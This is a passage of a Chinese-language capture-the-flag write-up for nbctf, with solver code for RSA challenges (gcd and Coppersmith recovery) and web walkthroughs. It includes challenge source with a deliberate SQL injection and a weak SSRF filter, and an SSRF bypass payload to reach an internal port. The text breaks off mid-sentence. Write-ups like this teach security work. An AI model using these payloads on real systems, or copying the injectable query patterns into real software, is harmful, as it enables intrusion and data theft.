pow(m,e,n2)</span></span><br><span class="line"><span class="comment">#根据ct1和ct2 得到n1和n2</span></span><br><span class="line"></span><br><span class="line">ct1 = <span class="number">196150896308015382573408099004515975466540094705348761587854272630906023749083911008835478259767648401709605726136589590310666858430120235218762651641330953170392784645631801449432061363776229651965539255255795373230255852992805188205639228954217034390731460194284731845705855212209524525682241998203303747513174581513168217999505436596818091279091144718119512522929858750349220346765422769476003604849600128605208123474607256344535541843454810706150705449483256361736428064150792476736751093915251743882647862500622465233906844054109281842278362125589335774364236155483783338907105809549449368926475631824722919958889450225026843225780470131268709445293157749</span></span><br><span class="line">ct2 = <span class="number">83507921327913521142443934492559420944369023782917085618978768157512494136296269338031471193927727958060037960270530278173852027186606624474398269053920321522448607751539858355179998108075848593814112217098612017462222420001262248144471923306139580601814218471659969728514600258330312623506466116333593434744460773476488134792248490905628242447603788884700795677619881924772996081377617066055448888668800826281711315468059146518373888252421991592124071284411947405472003802863596010724784730366575751160333120162778945930063499020829492960600318519615351417595308518636794008603089224459556289944808655338805251676963828327517925911000528943113536807796285824</span></span><br><span class="line"></span><br><span class="line">tmp = <span class="built_in">pow</span>(m,e)</span><br><span class="line">flag1 = tmp - ct1 <span class="comment">#= k1 * n1 = k1 * p * q1</span></span><br><span class="line">flag2 = tmp - ct2 <span class="comment">#= k2 * n2 = k2 * p * q2</span></span><br><span class="line">p = gmpy2.gcd(flag1,flag2)</span><br><span class="line"><span class="built_in">print</span>(gmpy2.gcd(p,flag2))</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(flag1 // p)</span><br><span class="line">k1q1 = flag1 // p</span><br><span class="line"><span class="comment">#得到k1和q1分解</span></span><br><span class="line">q1 = <span class="number">603701201822386830907144477326706640694145605732107023753674808182665696931502012989218558077472289899849882120737934821898165435847435044518846871242860227586749788240998624721376490806164324545522115137075097300642534248374378375756928831273442124872283671893345317220496457140852434166575343690062190540448032738970711476061243</span></span><br><span class="line">key = hashlib.sha256(long_to_bytes(q1)).digest()</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="comment"># enc_flag = cipher.encrypt(pad(b&quot;nbctf&#123;[REDACTED]&#125;&quot;, 16))</span></span><br><span class="line"></span><br><span class="line">enc_flag = <span class="string">&#x27;ac2289b707b174c541cf0952bf3b2057561b0872451444a5bbecf18c007ea20fa2b7c8a1707a74a1657e5adb5c1a417f&#x27;</span></span><br><span class="line">enc_flag = <span class="built_in">bytes</span>.fromhex(enc_flag)</span><br><span class="line"><span class="comment"># print(cipher.decrypt(enc_flag))</span></span><br><span class="line"><span class="comment"># print(enc_flag)</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;nbctf&quot;</span> <span class="keyword">in</span> cipher.decrypt(enc_flag):</span><br><span class="line">    <span class="built_in">print</span>(cipher.decrypt(enc_flag))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;nbctf&#123;c0ngr4ts_0n_F1nish1n9_Th3_3_P4rt3r!!!!&#125;\x03\x03\x03&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="crypto-too-little-information-solved">crypto/Too Little Information | SOLVED</h2><h3 id="题面：">题面：</h3><p>My computer crashed generating my keys. :( Can you recover them for me?</p><h3 id="题目：">题目：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(<span class="string">b&quot;nbctf&#123;[REDACTED]&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ct = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ct = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">hint = (p+q) &gt;&gt; <span class="number">200</span> <span class="comment"># I can&#x27;t be giving you that much!</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;hint = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">ct = <span class="number">20030315247290021934293927354887580426070566017560641204155610658927917290198737029903594702064351773446005018155094643288125396810753014936800515440652855824038470725838848349666236623899089094953181436465435270989651491997801177943499187812270081592263331832916362349716591828106306150603120693022149233534</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">90166344558664675592644684556355545187373291859609367810958775310181360193141550862577281658089332577942193823477148064165061303827534169112815736618901965700400798345371758370344207077280925015891945591352156370597957742921722432314582261224366498475465730899163137511778647694175484386010210005826793007961</span></span><br><span class="line">hint = <span class="number">12227137598952006551839416663729660224872609953685427677011433223002140448682395830146750981200</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="考点：移位-coppersmith">考点：移位 CopperSmith</h3><h3 id="解题：">解题：</h3><p>前置知识点：</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206153106063.png" alt="image-20231206153106063"></p><p>对移位这次一定要弄明白了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint &gt;&gt; <span class="number">200</span>   <span class="comment">#右移相当于缩小 </span></span><br></pre></td></tr></table></figure><blockquote><p>对于十进制来说：</p><p>做除运算 等价于hint // 2**200</p><p>对于二进制来说：</p><p>移位前0b10111011100100110101010000111011001111110110110110000001101011110000000101100100000100111001110101000011001001110  11000100101100011111011100110110000110011011100100011111110111110000111110000010100001001111001100001100110000111011011011001011111111101000010111101000011010011110001011111100111000111010010001010000</p><p>移位后0b10111011100100110101010000111011001111110110110110000001101011110000000101100100000100111001110101000011001001110</p><p>相当于直接截取掉低200位二进制数据</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint &lt;&lt; <span class="number">200</span>  <span class="comment">#左移相当于扩大</span></span><br></pre></td></tr></table></figure><blockquote><p>对于十进制来说：</p><p>做乘运算 等价于hint * 2**200</p><p>对于二进制来说：</p><p>移位前</p><p>0b1011101110010011010101000011101100111111011011011000000110101111000000010110010000010011100111010100001100100111011000100101100011111011100110110000110011011100100011111110111110000111110000010100001001111001100001100110000111011011011001011111111101000010111101000011010011110001011111100111000111010010001010000</p><p>移位后</p><p>0b在低200位填充0 相当于把原来位置的权值抬高了</p></blockquote><p>目前题目中给出的是</p><p><code>p+q &gt;&gt; 200</code></p><p>相当于p+q的低200位丢失了 需要恢复</p><p>在低位确实的运算中有这样一个特点：</p><p>n = p * q</p><p>n = p * (p + q - p)</p><p>得到关于p的一个方程</p><p>p*((p+q)-p) - n = 0</p><p>因为p+q是缺失低200位的</p><p>所以该方程解出的结果也是p也是部分数据 虽然结果也是512bit位的 但是存在部分数据丢失，具有相同的MBS(最高有效位)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p_ = var(<span class="string">&#x27;p_&#x27;</span>)</span><br><span class="line"><span class="comment">#当前hint的二进制位数为313 缺少200位</span></span><br><span class="line">approx_p_plus_q = hint &lt;&lt; <span class="number">200</span> <span class="comment">#反向移位补全数据 512</span></span><br><span class="line">approx_p = <span class="built_in">int</span>((p_*(approx_p_plus_q - p_) - n).roots()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(approx_p)  <span class="comment">#因为hint进行了填充 所以此时的p也是512位 具有相同最高有效位313 只不过低200位的数据不准确</span></span><br></pre></td></tr></table></figure><p>那么恢复丢失的数据 =&gt; CopperSmith</p><p>假设缺失的数据为x bit设置为200位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p3  <span class="comment">#p3因为低位截断了 所以一定是比真实值小的 补充一个x</span></span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^<span class="number">200</span>, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment">#求小根 其中第一个参数是2的kbits次方可以保证最后解得的小根是kbits位  就是缺失的位数</span></span><br><span class="line"><span class="built_in">print</span>(x0)</span><br><span class="line">p = p3+x0</span><br></pre></td></tr></table></figure><p>到此完美结束</p><p>调试exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#p3已知高位 这里的n就是N3</span></span><br><span class="line">hint = <span class="number">12227137598952006551839416663729660224872609953685427677011433223002140448682395830146750981200</span></span><br><span class="line">n = <span class="number">90166344558664675592644684556355545187373291859609367810958775310181360193141550862577281658089332577942193823477148064165061303827534169112815736618901965700400798345371758370344207077280925015891945591352156370597957742921722432314582261224366498475465730899163137511778647694175484386010210005826793007961</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#本事</span></span><br><span class="line">p_ = var(<span class="string">&#x27;p_&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bin</span>(hint))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&#x27;&#x27;&#x27;1011101110010011010101000011101100111111011011011000000110101111000000010110010000010011100111010100001100100111011000100101100011111011100110110000110011011100100011111110111110000111110000010100001001111001100001100110000111011011011001011111111101000010111101000011010011110001011111100111000111010010001010000&#x27;&#x27;&#x27;</span>))</span><br><span class="line">approx_p_plus_q = hint &lt;&lt; <span class="number">200</span></span><br><span class="line">approx_p = <span class="built_in">int</span>((p_*(approx_p_plus_q - p_) - n).roots()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(approx_p)</span><br><span class="line"><span class="comment">#解出p的低位</span></span><br><span class="line">p3=<span class="number">7304778595800693962623587470016492934656897172638927993210828812588740492194432727308053205092654458616385476570357533214681567145360876311971890757777044</span></span><br><span class="line"><span class="comment">#sage</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#p3已知高位 这里的n就是N3</span></span><br><span class="line"><span class="comment"># p3 = 7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span></span><br><span class="line"><span class="comment"># n = 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#全位数</span></span><br><span class="line"><span class="comment"># pbits = 512</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#缺省位数</span></span><br><span class="line"><span class="comment"># kbits = pbits - p3.nbits()#nbits()位数</span></span><br><span class="line"><span class="comment"># print (p3.nbits())</span></span><br><span class="line"><span class="comment"># p3 = p3 &lt;&lt; kbits   #反方向移动缺省的位数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bin</span>(p3))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&#x27;&#x27;&#xx27;&#x27;&#x27;</span>))</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p3  <span class="comment">#p3因为低位截断了 所以一定是比真实值小的 补充一个x</span></span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^<span class="number">200</span>, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment">#求小根 其中第一个参数是2的kbits次方可以保证最后解得的小根是kbits位  就是缺失的位数</span></span><br><span class="line"><span class="built_in">print</span>(x0)</span><br><span class="line">p = p3+x0</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;p: &quot;</span>, <span class="built_in">hex</span>(<span class="built_in">int</span>(p)))</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="comment">#assert是断言语句 如果是true 则正常执行 如果是false 则程序运行中断</span></span><br><span class="line"><span class="comment"># assert n % p == 0</span></span><br><span class="line">q = n // <span class="built_in">int</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">ct = <span class="number">20030315247290021934293927354887580426070566017560641204155610658927917290198737029903594702064351773446005018155094643288125396810753014936800515440652855824038470725838848349666236623899089094953181436465435270989651491997801177943499187812270081592263331832916362349716591828106306150603120693022149233534</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = gmpy2.invert(e,<span class="built_in">int</span>(phi))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(ct,d,n))))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;############test#####################&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bin</span>(approx_p))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bin</span>(p))</span><br></pre></td></tr></table></figure><p>flag:<code>b'nbctf&#123;cr34t1v3_fl4gs_4r3_s0_h4rd_t0_m4k3...&#125;'</code></p><h2 id="web-inspector-gadget">web/Inspector Gadget</h2><h3 id="题面：">题面：</h3><p>While snooping around this website, inspector gadet lost parts of his flag. Can you help him find it?</p><h3 id="题目：">题目：</h3><p><a href="https://inspector-gadget.chal.nbctf.com">inspector-gadget.chal.nbctf.com</a></p><h3 id="考点：信息收集">考点：信息收集</h3><p>F12</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206180159384.png" alt="image-20231206180159384"></p><p>直接在控制台跑一下<code>getflag()</code>函数</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206180248579.png" alt="image-20231206180248579"></p><p>图片遮盖</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206180335228.png" alt="image-20231206180335228"></p><hr><p>下面有很多点击功能点</p><p>挨个试一试</p><p><strong><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206180714726.png" alt="image-20231206180714726"></strong></p><p>进去之后</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206180743641.png" alt="image-20231206180743641"></p><p>title中发现flag</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206180822341.png" alt="image-20231206180822341"></p><p>信息泄露 robots.txt</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206180907075.png" alt="image-20231206180907075"></p><p>flag:<code>nbctf&#123;G00d_J06_D3tect1v3_G4dg3t352&#125;</code></p><h2 id="web-walter-s-crystal-shop">web/walter’s crystal shop</h2><h3 id="题面：">题面：</h3><p>My buddy Walter is selling some crystals, check out his shop!</p><h3 id="题目：">题目：</h3><p><a href="https://walters-crystal-shop.chal.nbctf.com">walters-crystal-shop.chal.nbctf.com</a></p><p>给出源码 直接打开app.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> sqlite3 = <span class="built_in">require</span>(<span class="string">&quot;sqlite3&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> db = <span class="keyword">new</span> sqlite3.<span class="title class_">Database</span>(<span class="string">&quot;:memory:&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;./flag.txt&quot;</span>, &#123; <span class="attr">encoding</span>: <span class="string">&quot;utf8&quot;</span> &#125;).<span class="title function_">trim</span>();</span><br><span class="line"><span class="keyword">const</span> crystals = <span class="built_in">require</span>(<span class="string">&quot;./crystals&quot;</span>);</span><br><span class="line"></span><br><span class="line">db.<span class="title function_">serialize</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  db.<span class="title function_">run</span>(<span class="string">&quot;CREATE TABLE crystals (name TEXT, price REAL, quantity INTEGER)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> stmt = db.<span class="title function_">prepare</span>(<span class="string">&quot;INSERT INTO crystals (name, price, quantity) VALUES (?, ?, ?)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> crystal <span class="keyword">of</span> crystals) &#123;</span><br><span class="line">    stmt.<span class="title function_">run</span>(crystal[<span class="string">&quot;name&quot;</span>], crystal[<span class="string">&quot;price&quot;</span>], crystal[<span class="string">&quot;quantity&quot;</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  stmt.<span class="title function_">finalize</span>();</span><br><span class="line"></span><br><span class="line">  db.<span class="title function_">run</span>(<span class="string">&quot;CREATE TABLE IF NOT EXISTS flag (flag TEXT)&quot;</span>);</span><br><span class="line">  db.<span class="title function_">run</span>(<span class="string">`INSERT INTO flag (flag) VALUES (&#x27;<span class="subst">$&#123;flag&#125;</span>&#x27;)`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/crystals&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; name &#125; = req.<span class="property">query</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!name) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123; <span class="attr">err</span>: <span class="string">&quot;Missing required fields&quot;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  db.<span class="title function_">all</span>(<span class="string">`SELECT * FROM crystals WHERE name LIKE &#x27;%<span class="subst">$&#123;name&#125;</span>%&#x27;`</span>, <span class="function">(<span class="params">err, rows</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(err.<span class="property">message</span>);</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Internal server error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">send</span>(rows);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">sendfile</span>(__dirname + <span class="string">&quot;/index.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Server listening on port 3000&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="考点：代码审计-sql注入">考点：代码审计 SQL注入</h3><h3 id="解题：">解题：</h3><p>通过代码审计 得到路由和参数</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206182417672.png" alt="image-20231206182417672"></p><p>路由：<code>crystals</code></p><p>参数：<code>name</code></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206182456391.png" alt="image-20231206182456391"></p><p>明确参数数量为3</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206182519692.png" alt="image-20231206182519692"></p><p>明确flag在数据库中的位置</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206182542740.png" alt="image-20231206182542740"></p><p>明确闭合方式 单引号闭合</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206182623878.png" alt="image-20231206182623878"></p><p>flag：<code>nbctf&#123;h0p3fuLLy_7h3_D3A_d035n7_kn0w_ab0ut_th3_0th3r_cRyst4l5&#125;</code></p><h2 id="web-secret-tunnel">web/secret tunnel</h2><h3 id="题面：">题面：</h3><p>Can you find the flag on the other end of my secret tunnel?</p><h3 id="题目：">题目：</h3><p><a href="https://secret-tunnel.chal.nbctf.com">secret-tunnel.chal.nbctf.com</a></p><p><a href="http://main.py">main.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, Response</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__,</span><br><span class="line">            static_url_path=<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            static_folder=<span class="string">&quot;static&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/fetchdata&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetchdata</span>():</span><br><span class="line">    url = request.form[<span class="string">&quot;url&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;127&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;No loopback for you!&quot;</span>, mimetype=<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> url.count(<span class="string">&#x27;.&#x27;</span>) &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;Only 2 dots allowed!&quot;</span>, mimetype=<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;x&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;I don&#x27;t like twitter &gt;:(&quot;</span> , mimetype=<span class="string">&quot;text/plain&quot;</span>) </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;It&#x27;s not gonna be that easy :)&quot;</span>, mimetype=<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="built_in">str</span>(e), mimetype=<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Response(res.text[:<span class="number">32</span>], mimetype=<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="http://flag.py">flag.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/flag&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> Response(flag, mimetype=<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(port=<span class="number">1337</span>)</span><br></pre></td></tr></table></figure><h3 id="考点：ssrf">考点：SSRF</h3><h3 id="解题：">解题：</h3><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206215124712.png" alt="image-20231206215124712"></p><p>明确4个限制</p><p>大体就知道是想让我们去访问内网的flag路由</p><p>那么在linux系统中</p><p>代替127.0.0.1的有很多</p><p>比如</p><p><code>0</code> <code>localhost</code></p><p>然后根据flag.py知道对于端口为<code>1337</code></p><p>同时flag需要转换 采用URL编码</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206215509152.png" alt="image-20231206215509152"></p><p>换一个f就行了</p><p>payload:<code>http://0:1337/%66lag</code></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206215555967.png" alt="image-20231206215555967"></p><p>法二：</p><p>用自己的服务器利用重定向跳转</p><p>输入框 =&gt; 